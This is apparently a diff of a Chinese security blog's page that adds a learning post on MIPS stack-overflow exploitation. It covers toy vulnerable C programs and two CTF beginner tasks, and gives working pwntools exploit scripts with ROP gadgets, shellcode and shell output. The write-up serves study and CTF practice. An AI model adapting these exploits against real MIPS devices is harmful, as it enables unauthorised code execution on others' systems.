@@ -147,6 +147,146 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/17/mips%E5%88%9D%E4%BD%93%E9%AA%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="rootzhang">
+      <meta itemprop="description" content="我的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="study">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/17/mips%E5%88%9D%E4%BD%93%E9%AA%8C/" class="post-title-link" itemprop="url">mips初体验</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-01-17 16:07:28 / 修改时间：16:08:11" itemprop="dateCreated datePublished" datetime="2022-01-17T16:07:28+08:00">2022-01-17</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="mips栈溢出"><a href="#mips栈溢出" class="headerlink" title="mips栈溢出"></a>mips栈溢出</h1><p>mips函数调用：x86函数调用时都是把范湖地址放在栈内，函数执行完再通过返回地址执行下一条指令，mips的函数调用和x86有些像又有些不像，在mips程序中，函数分为叶子函数和非叶子函数，对应数据结构中的树，叶子函数指不在调用函数的函数，非叶子函数指函数内部又调用了其他函数的函数，两种函数对返回值的处理是不一样的，当调用叶子函数时，会直接把返回地址储存在$ra寄存器中，调用非叶子函数时，$ra储存着函数的返回地址，在函数初始部分会直接把$ra的地址入栈，当执行完这个函数时再找到地址返回对应指令。</p>
+<h2 id="举例一"><a href="#举例一" class="headerlink" title="举例一"></a>举例一</h2><p>源代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">()</span></span>&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">has_stack</span><span class="params">(<span class="keyword">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> dst[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">strcpy</span>(dst,src);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;copy successfully&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">has_stack(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先进行编译</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">mipsel-linux-gcc vuln -static(指静态绑定，不使用共享库)</span></span><br></pre></td></tr></table></figure>
+
+<p>file查看一下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/mipsshell$ file vuln</span><br><span class="line">vuln: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>可见成功编译</p>
+<p>然后拖入ida查看他的汇编代码</p>
+<p>main</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00400490                 addiu   $sp, -0x20</span><br><span class="line">.text:00400494                 sw      $ra, 0x20+var_4($sp)</span><br><span class="line">.text:00400498                 sw      $fp, 0x20+var_8($sp)</span><br><span class="line">.text:0040049C                 move    $fp, $sp</span><br><span class="line">.text:004004A0                 sw      $a0, 0x20+arg_0($fp)</span><br><span class="line">.text:004004A4                 sw      $a1, 0x20+arg_4($fp)</span><br><span class="line">.text:004004A8                 lw      $v0, 0x20+arg_4($fp)</span><br><span class="line">.text:004004AC                 addiu   $v0, 4</span><br><span class="line">.text:004004B0                 lw      $v0, 0($v0)</span><br><span class="line">.text:004004B4                 move    $a0, $v0</span><br><span class="line">.text:004004B8                 jal     has_stack</span><br><span class="line">.text:004004BC                 nop</span><br><span class="line">.text:004004C0                 nop</span><br><span class="line">.text:004004C4                 move    $sp, $fp</span><br><span class="line">.text:004004C8                 lw      $ra, 0x20+var_4($sp)</span><br><span class="line">.text:004004CC                 lw      $fp, 0x20+var_8($sp)</span><br><span class="line">.text:004004D0                 addiu   $sp, 0x20</span><br><span class="line">.text:004004D4                 jr      $ra</span><br><span class="line">.text:004004D8                 nop</span><br></pre></td></tr></table></figure>
+
+<p>刚进入main函数就对$sp进行了操作，这个$sp对应x86的rsp，储存着栈底的地址，第一条指令的操作就是开辟main函数的栈帧，由于main是非叶子函数所以得把$ra压入栈，第二条指令就是执行这个操作，当main函数指令完主要部分后就会执行<code>lw      $ra, 0x20+var_4($sp)</code>指令，这个指令就是把返回地址存入$ra中，最后<code>jr      $ra</code>进行跳转。</p>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>程序中对输入值没有限制就直接放入has_stack函数的栈中，而has_stack函数又是非叶子函数，栈中储存着返回地址，只要确定输入的地址和储存返回地址的地址的差值就可以对返回地址进行准确覆盖了，可以直接通过ida确定，也可以让程序跑起来再确定</p>
+<h2 id="尝试攻击（确定填充量）"><a href="#尝试攻击（确定填充量）" class="headerlink" title="尝试攻击（确定填充量）"></a>尝试攻击（确定填充量）</h2><p>运行加调试</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">qemu-misepl -g 1234 ./vuln <span class="string">&quot;aaaaa&quot;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">gdb-multiarch ./vuln</span></span><br><span class="line"><span class="meta">#</span><span class="bash">target remote:1234</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>程序就开始运行并调试起来了</p>
+<p>调试效果</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">08:0020│    0x76ffef60 ◂— &#x27;aaaaaaaa&#x27;</span><br><span class="line">09:0024│    0x76ffef64 ◂— &#x27;aaaa&#x27;</span><br><span class="line">0a:0028│ v1 0x76ffef68 ◂— 0</span><br><span class="line">0b:002c│    0x76ffef6c ◂— 0</span><br><span class="line">0c:0030│    0x76ffef70 —▸ 0x76ffef78 —▸ 0x76fff283 ◂— &#x27;aaaaaaaaaaaaaaaa&#x27;</span><br><span class="line">0d:0034│    0x76ffef74 —▸ 0x4004c0 (main+48) ◂— 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可见buf和ra之间差28个字节</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel vuln `python -c &quot;print &#x27;a&#x27;*28+&#x27;\xb4\x03\x40\x00&#x27;&quot;`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">拿到shell</span><br><span class="line">rootzhang@rootzhang-virtual-machine:~/mipsshell/stady$ qemu-mipsel vuln `python -c &quot;print &#x27;a&#x27;*28+&#x27;\xb4\x03\x40\x00&#x27;&quot;`</span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">core  pwnc.py  vuln  vuln.id0  vuln.id1  vuln.nam  vuln.til</span><br><span class="line"><span class="meta">$</span><span class="bash"> </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="举例二"><a href="#举例二" class="headerlink" title="举例二"></a>举例二</h2><p>源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_system</span><span class="params">(<span class="keyword">int</span> code,<span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">255</span>];</span><br><span class="line">system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"><span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> filelen=<span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">fileData</span>;</span></span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span>==stat(<span class="string">&quot;passwd&quot;</span>,&amp;fileData))</span><br><span class="line">&#123;</span><br><span class="line">filelen=fileData.st_size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>((fp=fopen(<span class="string">&quot;passwd&quot;</span>,<span class="string">&quot;rb&quot;</span>))==<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cannot open file passwd!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">ch=fgetc(fp);</span><br><span class="line"><span class="keyword">while</span>(count&lt;=filelen)</span><br><span class="line">&#123;</span><br><span class="line">buf[count++]=ch;</span><br><span class="line">ch=fgetc(fp);</span><br><span class="line">&#125;</span><br><span class="line">buf[--count]=<span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf,<span class="string">&quot;adminpwd&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">do_system(count,<span class="string">&quot;ls -l&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;you have an invalid password!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>会打开本地的passwd文件，不对文件内容做限制直接放进buf中，而main又是非叶子函数，返回地址保存在栈中，可以直接覆盖返回地址为后门函数的地址，但是后门函数里system的参数不是固定的，是后门函数的第二个参数，第二个参数的用寄存器$a1储存，所以得在调用前对$a1赋值才行，在x86里面都是用gadget完成参数构造，在mips里面也是，不过这次是用ida查找gadget</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">Python&gt;</span><span class="bash">mipsrop.stackfinder()----------------------------------------------------------------------------------------------------------------|  Address     |  Action                                              |  Control Jump                          |----------------------------------------------------------------------------------------------------------------|  0x00401F90  |  addiu <span class="variable">$a1</span>,<span class="variable">$sp</span>,0x58+var_40                           |  jr    0x58+var_4(<span class="variable">$sp</span>)                 |----------------------------------------------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure>
+
+<p>这个gadget的地址是0x00401F90,通过其汇编可知可以通过栈来对$a1进行赋值，然后再 jr    0x58+var_4($sp) ，所以只要在对应位置填充对应值就行了。</p>
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>本来打算把这个拖进ida直接看偏移量的，结果发现他反汇编出来的代码和源代码也相差太大了，于是放弃ida直接通过运行确定偏移量。</p>
+<p>找到buf地址</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> 08:0020│  0x76ffedf8 ◂— 0x3c /* <span class="string">&#x27;&lt;&#x27;</span> */09:0024│  0x76ffedfc —▸ 0x425908 ◂— move   <span class="variable">$t4</span>, <span class="variable">$zero</span> /* 0x6025; <span class="string">&#x27;%`&#x27;</span> */... ↓     2 skipped0c:0030│  0x76ffee08 ◂— 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)... ↓     3 skippedpwndbg&gt; 10:0040│  0x76ffee18 ◂— 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span></span><br></pre></td></tr></table></figure>
+
+<p>储存返回地址的地址是0x76ffedd8+0x1cc，算出</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">offest=0x76ffedd8+0x1cc-0x76ffee08=0x19c</span><br></pre></td></tr></table></figure>
+
+<p>可以得到payload</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=&#x27;a&#x27;*0x19c+p32(gadget_addr)+&#x27;a&#x27;*0x18+&#x27;/bin/sh\x00&#x27;payload=payload.ljust(0x1a0+0x54,&#x27;a&#x27;)payload=payload+p32(dock_addr)</span><br></pre></td></tr></table></figure>
+
+<p>最终脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *gadget_addr=0x00401F90dock_addr=<span class="number">0x004003B0f</span>=<span class="built_in">open</span>(<span class="string">&quot;passwd&quot;</span>,<span class="string">&quot;wb&quot;</span>)payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x19c</span>+p32(gadget_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;/bin/sh\x00&#x27;</span>payload=payload.ljust(<span class="number">0x1a0</span>+<span class="number">0x54</span>,<span class="string">&#x27;a&#x27;</span>)payload=payload+p32(dock_addr)f.write(payload)f.close()</span><br></pre></td></tr></table></figure>
+
+<p>得到shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/mipsshell/stady1$ qemu-mipsel ./vulnyou have an invalid password!$ lscore  passwd  pwnc.py  vuln  vuln.c  vuln.id0  vuln.id1  vuln.nam  vuln.til</span><br></pre></td></tr></table></figure>
+
+<p>总结：gdb-multiarch调试的时候好像不能b+函数名，不然抓不到，得确切的地址才可以。</p>
+<h2 id="举例三-HWX-mipspwn入门题"><a href="#举例三-HWX-mipspwn入门题" class="headerlink" title="举例三 HWX mipspwn入门题"></a>举例三 HWX mipspwn入门题</h2><p>知识补充：mips一般都是堆栈可执行的，所以只要向堆栈中放入shellcode，然后利用返回地址跳到shellcode就行了（泄露栈地址），</p>
+<p>源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span>&#123;  <span class="keyword">int</span> v3; <span class="comment">// $a2  int v5; // [sp+18h] [+18h]  setbuf(stdin, 0, envp);  setbuf(stdout, 0, v3);  printf(&quot;\x1B[33m&quot;);  puts(&quot;-----we1c0me t0 MP l0g1n s7stem-----&quot;);  v5 = sub_400840();  sub_400978(v5);  printf(&quot;\x1B[32m&quot;);  return puts(&quot;Now you getshell~&quot;);&#125;int sub_400840()&#123;  char v1[24]; // [sp+18h] [+18h] BYREF  memset(v1, 0, sizeof(v1));  printf(&quot;\x1B[34m&quot;);  printf(&quot;Username : &quot;);  read(0, v1, 24);  if ( strncmp(v1, &quot;admin&quot;, 5) )    exit(0);  printf(&quot;Correct name : %s&quot;, v1);  return strlen(v1);&#125;int __fastcall sub_400978(int a1)&#123;  char v2[20]; // [sp+18h] [+18h] BYREF  int v3; // [sp+2Ch] [+2Ch]  char v4[36]; // [sp+3Ch] [+3Ch] BYREF  v3 = a1 + 4;  printf(&quot;\x1B[31m&quot;);  printf(&quot;Pre_Password : &quot;);  read(0, v2, 36);  printf(&quot;Password : &quot;);  read(0, v4, v3);  if ( strncmp(v2, &quot;access&quot;, 6) || strncmp(v4, &quot;0123456789&quot;, 10) )    exit(0);  return puts(&quot;Correct password : **********&quot;);&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这道题漏洞比较明显，第一个函数泄露栈地址，第二个函数泄露填充shellocde然后调到这执行就行。</p>
+<p>按道理来说这样就行了，把buf填满就能泄露处栈地址了，但是我发现我的栈地址最后是0x00,导致%s输出的时候会截断，然后我重试了很多次，发现栈地址最后都是0x00,最后破案了，我的qemu-mipsel没有开aslr,所以栈地址一直都是固定的，百度谷歌一顿查都说qemu的aslr默认关闭，但是没人告诉我怎么开，哎，那就当我泄露出来了继续做吧（反正栈地址不变）。</p>
+<p>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>)io = process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])<span class="comment">#io = process([&quot;qemu-mipsel&quot;,&#x27;-g&#x27;,&#x27;1234&#x27;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])io.sendafter(&quot;name : &quot;,&quot;admin&quot;.ljust(0x18,&#x27;a&#x27;))io.recvuntil(&quot;Correct name : &quot;);sp=0x76fff000io.sendafter(&#x27;Pre_Password : &#x27;,&quot;access&quot;.ljust(20,&#x27;a&#x27;)+p32(0x100))io.sendafter(&#x27;Password : &#x27;,&#x27;0123456789&#x27;.ljust(0x28,&#x27;a&#x27;)+p32(sp)+asm(shellcraft.sh()))io.interactive()</span></span><br></pre></td></tr></table></figure>
+
+<p>效果</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/mipsshell/HWS/pwn1/Mplogin/Mplogin$ python pwnc.py[+] Starting local process &#x27;/usr/bin/qemu-mipsel&#x27;: pid 16096[*] Switching to interactive modeCorrect password : **********$ lscore  lib  pwn    pwnc.py  qemu_pwn_20220117-133618_15898.core</span><br></pre></td></tr></table></figure>
+
+<h2 id="举例三-HWX-mipspwn入门题二"><a href="#举例三-HWX-mipspwn入门题二" class="headerlink" title="举例三 HWX mipspwn入门题二"></a>举例三 HWX mipspwn入门题二</h2><p>这道题是mips大端程序，不知道为啥我的gdb-multiarch老是爆段错误，查了好半天也没查出来啥问题，我看别人调试mips大端也是我这样调试的啊，奇了怪了，本来想通过调试找到到ra的偏移量的，不过一个一个输也能找见，那就这样把，别的师傅找到离ra的偏移量是0x90，直接拿来用就行（mips环境好司马）</p>
+<p>这道题和上道题有些像又有些不像，两道题都是直接shellcode,不过上道题直接shellcode的地址，这道题不知道，只知道shellcode离sp的偏移量，就不能直接通过ra直接跳到shellcode执行了，得通过gadget间接跳转到这里才行</p>
+<p>ida的mipsrop</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">Python&gt;</span><span class="bash">mipsrop.stackfinder()----------------------------------------------------------------------------------------------------------------|  Address     |  Action                                              |  Control Jump                          |----------------------------------------------------------------------------------------------------------------|  0x004273C4  |  addiu <span class="variable">$a2</span>,<span class="variable">$sp</span>,0x98+var_34                           |  jalr  <span class="variable">$s0</span>                             ||  0x0042BCD0  |  addiu <span class="variable">$a2</span>,<span class="variable">$sp</span>,0xB0+var_34                           |  jalr  <span class="variable">$s2</span>                             ||  0x0042FA00  |  addiu <span class="variable">$v1</span>,<span class="variable">$sp</span>,0x160+var_12C                         |  jalr  <span class="variable">$s1</span>                             ||  0x004491F8  |  addiu <span class="variable">$a2</span>,<span class="variable">$sp</span>,0x60+var_28                           |  jalr  <span class="variable">$s1</span>                             ||  0x0044931C  |  addiu <span class="variable">$v0</span>,<span class="variable">$sp</span>,0x48+var_20                           |  jalr  <span class="variable">$s1</span>                             ||  0x00449444  |  addiu <span class="variable">$a2</span>,<span class="variable">$sp</span>,0x60+var_28                           |  jalr  <span class="variable">$s1</span>                             ||  0x0044AD58  |  addiu <span class="variable">$a1</span>,<span class="variable">$sp</span>,0x78+var_40                           |  jalr  <span class="variable">$s4</span>                             ||  0x0044AEFC  |  addiu <span class="variable">$a1</span>,<span class="variable">$sp</span>,0x80+var_44                           |  jalr  <span class="variable">$s5</span>                             ||  0x0044B154  |  addiu <span class="variable">$a1</span>,<span class="variable">$sp</span>,0x80+var_4C                           |  jalr  <span class="variable">$s2</span>                             ||  0x0044B1EC  |  addiu <span class="variable">$v0</span>,<span class="variable">$sp</span>,0x80+var_54                           |  jalr  <span class="variable">$s2</span>                             ||  0x0044B3EC  |  addiu <span class="variable">$v0</span>,<span class="variable">$sp</span>,0x198+var_158                         |  jalr  <span class="variable">$s0</span>                             ||  0x00454E94  |  addiu <span class="variable">$s7</span>,<span class="variable">$sp</span>,0xE0+var_C0                           |  jalr  <span class="variable">$s3</span>                             ||  0x00465BEC  |  addiu <span class="variable">$a1</span>,<span class="variable">$sp</span>,0xE8+var_BC                           |  jalr  <span class="variable">$s0</span>                             |----------------------------------------------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure>
+
+<p>这些都是程序自带的gadget了</p>
+<p>程序最后是这样处理s寄存器的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move    $sp, $fp.text:00400A30                 lw      $ra, 0x58+var_s24($sp).text:00400A34                 lw      $fp, 0x58+var_s20($sp).text:00400A38                 lw      $s7, 0x58+var_s1C($sp).text:00400A3C                 lw      $s6, 0x58+var_s18($sp).text:00400A40                 lw      $s5, 0x58+var_s14($sp).text:00400A44                 lw      $s4, 0x58+var_s10($sp).text:00400A48                 lw      $s3, 0x58+var_sC($sp).text:00400A4C                 lw      $s2, 0x58+var_s8($sp).text:00400A50                 lw      $s1, 0x58+var_s4($sp).text:00400A54                 lw      $s0, 0x58+var_s0($sp).text:00400A58                 addiu   $sp, 0x80.text:00400A5C                 jr      $ra.text:00400A60                 nop.text:00400A60  # End of function pwn</span><br></pre></td></tr></table></figure>
+
+<p>这些地方都可以溢出到，所以可以控制s0-s7的寄存器的值，那前面的那些gadget都能拿来用，我们直接使用第一个。</p>
+<p>把shellcode存在$sp,0x98+var_34上，然后把ra覆盖成第一个gadget的地址，那就会把shellcode的地址给$a2,然后跳转到$s0执行代码，$s0是可控的，我们还可以填充一个跳转到$s2的gadget，最后就顺利执行shellcode代码了。</p>
+<p>那怎么找第二个gadget呢，在mips中一般是通过$t9完成间接跳转的，可以在ida中这样搜索gadget</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">Python&gt;</span><span class="bash">mipsrop.find(<span class="string">&quot;move <span class="variable">$t9</span>,<span class="variable">$a2</span>&quot;</span>)----------------------------------------------------------------------------------------------------------------|  Address     |  Action                                              |  Control Jump                          |----------------------------------------------------------------------------------------------------------------|  0x00421684  |  move <span class="variable">$t9</span>,<span class="variable">$a2</span>                                        |  jr    <span class="variable">$a2</span>                             |----------------------------------------------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure>
+
+<p>这个gadget的意思是把$a2的值赋值给$t9，然后跳转到$a2执行代码。</p>
+<p>思路滤好了，就可以开始着手写代码了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;big&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)io = process([<span class="string">&quot;qemu-mips&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])io.sendlineafter(<span class="string">&quot;number:&quot;</span>,<span class="string">&quot;1&quot;</span>)ra = <span class="number">0x004273C4</span> <span class="comment"># move sp+0x64 to a2 -&gt; jmp s0s0 = 0x00421684 # jmp a2                   payload = &#x27;1:&#x27;payload += &#x27;a&#x27;*0x6c + p32(s0) + &#x27;a&#x27;*0x20 + p32(ra)payload += &#x27;a&#x27;*0x64 + asm(shellcraft.sh())io.sendlineafter(&quot;Job.&#x27;&quot;,payload)io.interactive()</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="总结：mips一般通过shellcode得到shell-跳转到shellcode不是知道地址直接跳就是通过几个gadget跳。能泄露栈地址就选第一个，不能泄露就选第二个。"><a href="#总结：mips一般通过shellcode得到shell-跳转到shellcode不是知道地址直接跳就是通过几个gadget跳。能泄露栈地址就选第一个，不能泄露就选第二个。" class="headerlink" title="总结：mips一般通过shellcode得到shell,跳转到shellcode不是知道地址直接跳就是通过几个gadget跳。能泄露栈地址就选第一个，不能泄露就选第二个。"></a>总结：mips一般通过shellcode得到shell,跳转到shellcode不是知道地址直接跳就是通过几个gadget跳。能泄露栈地址就选第一个，不能泄露就选第二个。</h2><p>最近mips给我整恶心了🤢，打算放mips先不搞mips了，先去复现一些x86的题目了。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/11/io-file%E4%B9%8Bstdout/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1065,84 +1205,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/06/%E6%A0%88%E6%9A%82%E6%97%B6%E5%B0%B1%E5%88%B0%E8%BF%99%E4%BA%86/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
